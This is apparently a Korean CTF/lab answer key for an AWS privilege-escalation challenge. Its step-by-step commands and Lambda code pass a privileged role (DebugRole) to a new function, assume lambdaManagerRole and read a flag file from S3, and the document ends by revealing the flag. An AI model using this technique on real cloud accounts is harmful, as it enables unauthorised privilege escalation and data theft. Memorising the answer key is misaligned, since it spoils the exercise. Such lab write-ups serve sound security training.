# [lambda_privesc_bypass] 모범 답안

1. Terraform을 통해 생성된 Access Key와 Secret Key를 사용하여 AWS CLI 프로필을 구성한다.


```bash
aws configure --profile yejin
```
2. 설정이 올바르게 되었는지 확인한다.
```bash
aws sts get-caller-identity --profile yejin
```

3. Lambda 공격용 코드를 작성한다(lambda_function.py).
```bash
import boto3

def lambda_handler(event, context):
    sts = boto3.client('sts')
    assumed_role = sts.assume_role(
        RoleArn="arn:aws:iam::[계정 ID]:role/lambdaManagerRole",
        RoleSessionName="poc-session",
        ExternalId="poc-external-id"
    )
    creds = assumed_role['Credentials']
    s3 = boto3.client('s3',
        aws_access_key_id=creds['AccessKeyId'],
        aws_secret_access_key=creds['SecretAccessKey'],
        aws_session_token=creds['SessionToken']
    )
    obj = s3.get_object(Bucket="flag-bucket-lambda-privesc", Key="flag.txt")
    flag = obj['Body'].read().decode()
    print("FLAG:", flag)
    return {"flag": flag}
```

4. 작성한 Lambda 코드를 zip으로 압축한다.
```bash
zip function.zip lambda_function.py
```

5. Lambda 함수를 생성한다.
```bash
aws lambda create-function \
  --function-name privEscLambda \
  --runtime python3.12 \
  --role arn:aws:iam::[계정 ID]:role/DebugRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://function.zip \
  --region ap-northeast-2 \
  --profile yejin
```
6. 만약 에러가 나면 기본 3초인 timeout을 10초로 설정한다.
```bash
aws lambda update-function-configuration \
  --function-name privEscLambda \
  --timeout 10 \
  --region ap-northeast-2 \
  --profile yejin
```

7. Lambda 함수를 실행하고 flag를 출력한다.
```bash
aws lambda invoke \
  --function-name privEscLambda \
  --payload '{}' \
  --log-type Tail \
  --query 'LogResult' \
  --output text \
  --region ap-northeast-2 \
  --profile yejin \
  outfile.txt | base64 -d
```

`flag` : FLAG{happyhappyhappy~!}


